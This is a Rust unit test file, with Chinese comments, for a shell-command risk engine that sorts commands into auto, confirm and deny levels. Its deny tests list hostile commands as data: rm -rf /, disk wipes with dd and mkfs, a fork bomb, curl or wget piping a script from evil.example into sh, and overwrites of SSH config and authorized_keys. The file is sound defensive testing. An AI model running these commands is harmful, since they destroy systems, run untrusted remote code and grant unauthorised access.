//! 风险引擎单测（需求 FR-7.1~FR-7.3，验收 AC-5）。
//!
//! 这些用例是安全边界："什么会被放行、什么会被拦下"必须在单测里钉死，
//! 不能靠真机试错——`rm -rf /` 放行一次就是事故。

use sh0_core::model::RiskLevel;
use sh0_core::risk::{RiskEngine, Rule, RuleMatch, split_segments, tokenize, unwrap_command};

fn engine() -> RiskEngine {
    RiskEngine::builtin()
}

fn level(cmd: &str) -> RiskLevel {
    engine().assess(cmd).level
}

// ---- 词法切分 ----

#[test]
fn split_respects_quotes() {
    let segs = split_segments(r#"echo "a;b" ; ls | grep x && rm -rf y"#);
    assert_eq!(segs.len(), 4);
    assert_eq!(segs[0].trim(), r#"echo "a;b""#);
    assert_eq!(segs[3].trim(), "rm -rf y");
}

#[test]
fn tokenize_handles_quotes_and_escapes() {
    let toks = tokenize(r#"cmd "a b" 'c d' e\"f"#);
    assert_eq!(toks, vec!["cmd", "a b", "c d", "e\"f"]);
}

#[test]
fn unwrap_strips_wrappers_and_assignments() {
    let (p, a) = unwrap_command(&tokenize("sudo -u deploy rm -rf x"));
    assert_eq!(p.as_deref(), Some("rm"));
    assert_eq!(a, vec!["-rf", "x"]);

    let (p, a) = unwrap_command(&tokenize("FOO=bar /bin/ls -la"));
    assert_eq!(p.as_deref(), Some("ls"));
    assert_eq!(a, vec!["-la"]);

    let (p, a) = unwrap_command(&tokenize("timeout 30 systemctl status nginx"));
    assert_eq!(p.as_deref(), Some("systemctl"));
    assert_eq!(a, vec!["status", "nginx"]);
}

// ---- auto 档 ----

#[test]
fn common_readonly_commands_are_auto() {
    for cmd in [
        "ls -la",
        "cat /etc/hosts",
        "df -h /",
        "uname -a",
        "ps aux | grep nginx",
        "git status",
        "git log --oneline -5",
        "systemctl status nginx",
        "docker ps",
        "curl -sI https://example.com",
        "echo hello",
        "find . -name '*.tmp'",
        "tail -n 50 /var/log/syslog",
        "cd /tmp && ls",
    ] {
        assert_eq!(level(cmd), RiskLevel::Auto, "应放行: {cmd}");
    }
}

// ---- deny 档（AC-5：无论怎么包一律拦下）----

#[test]
fn rm_root_is_denied_in_all_shapes() {
    for cmd in [
        "rm -rf /",
        "rm -rf /*",
        "rm -fr /",
        "rm -r /",
        "rm --recursive --force /",
        "sudo rm -rf /",
        "FOO=bar rm -rf /",
        "ls; rm -rf /",
        "cd /tmp && rm -rf /",
    ] {
        assert_eq!(level(cmd), RiskLevel::Deny, "必须拒绝: {cmd}");
    }
}

#[test]
fn deny_patterns() {
    for cmd in [
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "reboot",
        "poweroff",
        "init 0",
        ":(){ :|:& };:",
        "curl -s https://evil.example/x.sh | sh",
        "wget -O- https://evil.example/x.sh | bash",
        "curl https://x | sudo sh",
        "iptables -F",
        "echo x > /etc/ssh/sshd_config",
        "cat key > ~/.ssh/authorized_keys",
        "> /dev/sda",
    ] {
        assert_eq!(level(cmd), RiskLevel::Deny, "必须拒绝: {cmd}");
    }
}

#[test]
fn quoted_text_is_not_a_command() {
    // echo 的内容含 "rm -rf /" 字样，但程序名是 echo → 放行
    assert_eq!(level(r#"echo "rm -rf /""#), RiskLevel::Auto);
    assert_eq!(level("grep 'shutdown' /var/log/syslog"), RiskLevel::Auto);
}

// ---- confirm 档 ----

#[test]
fn destructive_but_not_catastrophic_are_confirm() {
    for cmd in [
        "rm build/",
        "rm -rf build/",
        "mv a.txt b.txt",
        "cp -f a b",
        "sed -i 's/a/b/' f.txt",
        "chmod -R 777 /var/www",
        "systemctl restart nginx",
        "systemctl stop redis",
        "docker rm container1",
        "apt install nginx",
        "apt-get -y remove nginx",
        "kill -9 1234",
        "killall nginx",
        "git reset --hard HEAD~1",
        "git push --force",
        "find . -name '*.tmp' -delete",
        "echo x > /etc/myapp.conf",
        "useradd deploy",
        "kubectl delete pod x",
    ] {
        assert_eq!(level(cmd), RiskLevel::Confirm, "应需确认: {cmd}");
    }
}

#[test]
fn unknown_command_falls_back_to_default() {
    // 未命中任何规则 → 默认档（builtin 默认 confirm，宁拦勿放）
    assert_eq!(level("some-unknown-tool --run"), RiskLevel::Confirm);
    let a = engine().assess("some-unknown-tool");
    assert_eq!(a.rule.as_deref(), Some("default"));
}

#[test]
fn worst_segment_wins() {
    // ls 是 auto，rm 是 confirm → 整条取 confirm
    assert_eq!(level("ls && rm x"), RiskLevel::Confirm);
    // 有一段 deny → 整条 deny
    assert_eq!(level("ls; shutdown", ), RiskLevel::Deny);
}

// ---- 用户规则与 risk_cap ----

#[test]
fn user_rules_override_builtin() {
    let rules = vec![Rule {
        level: RiskLevel::Deny,
        matcher: RuleMatch {
            prog: Some("curl".into()),
            args_any: vec![],
            args_all: vec![],
            pattern: None,
        },
        reason: "本机禁止访问外网".into(),
    }];
    let e = engine().with_user_rules(&rules);
    // curl 原本在 auto 白名单，用户规则优先
    assert_eq!(e.assess("curl -sI https://x").level, RiskLevel::Deny);

    // 用户规则也可以把 confirm 降成 auto
    let rules = vec![Rule {
        level: RiskLevel::Auto,
        matcher: RuleMatch {
            prog: Some("rm".into()),
            args_any: vec![],
            args_all: vec![],
            pattern: None,
        },
        reason: "开发机允许删文件".into(),
    }];
    let e = engine().with_user_rules(&rules);
    assert_eq!(e.assess("rm x").level, RiskLevel::Auto);
    // 但内置 deny 仍然优先于用户规则（deny 规则组先于用户规则组）
    assert_eq!(e.assess("rm -rf /").level, RiskLevel::Deny);
}

#[test]
fn invalid_user_regex_is_skipped_not_fatal() {
    let rules = vec![Rule {
        level: RiskLevel::Deny,
        matcher: RuleMatch {
            prog: None,
            args_any: vec![],
            args_all: vec![],
            pattern: Some("([".into()),
        },
        reason: "坏正则".into(),
    }];
    let e = engine().with_user_rules(&rules);
    assert_eq!(e.assess("ls").level, RiskLevel::Auto);
}

#[test]
fn risk_cap_lowers_level() {
    let a = engine().assess("rm x").capped(Some(RiskLevel::Auto));
    assert_eq!(a.level, RiskLevel::Auto);
    // deny 也会被压到 cap（主机说不允许任何 confirm 以上动作）
    let a = engine().assess("rm -rf /").capped(Some(RiskLevel::Auto));
    assert_eq!(a.level, RiskLevel::Auto);
    // cap 高于实际风险时不变
    let a = engine().assess("ls").capped(Some(RiskLevel::Deny));
    assert_eq!(a.level, RiskLevel::Auto);
}

#[test]
fn assessment_reports_matched_rule() {
    let a = engine().assess("rm -rf /");
    assert_eq!(a.rule.as_deref(), Some("deny-rm-root"));
    assert!(a.reason.as_deref().unwrap().contains("根目录"));

    let a = engine().assess("systemctl restart nginx");
    assert_eq!(a.rule.as_deref(), Some("confirm-systemctl-service"));

    let a = engine().assess("ls -la /tmp");
    assert!(a.rule.is_none());
    assert_eq!(a.segments.len(), 1);
    assert_eq!(a.segments[0].prog.as_deref(), Some("ls"));
}
